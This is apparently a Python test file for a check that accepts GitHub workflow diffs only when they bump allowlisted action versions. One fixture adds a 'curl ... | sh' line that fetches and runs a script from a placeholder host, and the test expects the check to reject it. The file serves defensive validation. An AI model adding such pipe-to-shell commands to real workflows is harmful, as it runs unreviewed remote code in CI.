from tests.workflow_dependency_maintenance import changed_lines_are_dependency_only


def test_accepts_only_allowlisted_action_version_lines() -> None:
    diff = """\
--- a/.github/workflows/test.yml
+++ b/.github/workflows/test.yml
-      - uses: actions/checkout@v6
+      - uses: actions/checkout@v7
-        uses: github/codeql-action/upload-sarif@v3
+        uses: github/codeql-action/upload-sarif@v4
-        uses: google-github-actions/deploy-cloudrun@v2
+        uses: google-github-actions/deploy-cloudrun@v3
"""
    assert changed_lines_are_dependency_only(diff) is True


def test_rejects_empty_diff() -> None:
    assert changed_lines_are_dependency_only("") is False


def test_rejects_workflow_logic_mutation_mixed_with_version_bump() -> None:
    diff = """\
-      - uses: actions/checkout@v6
+      - uses: actions/checkout@v7
+      - run: curl https://example.invalid/script | sh
"""
    assert changed_lines_are_dependency_only(diff) is False


def test_rejects_unapproved_action_or_version_transition() -> None:
    assert changed_lines_are_dependency_only("- uses: actions/setup-python@v5\n+ uses: actions/setup-python@v6") is False
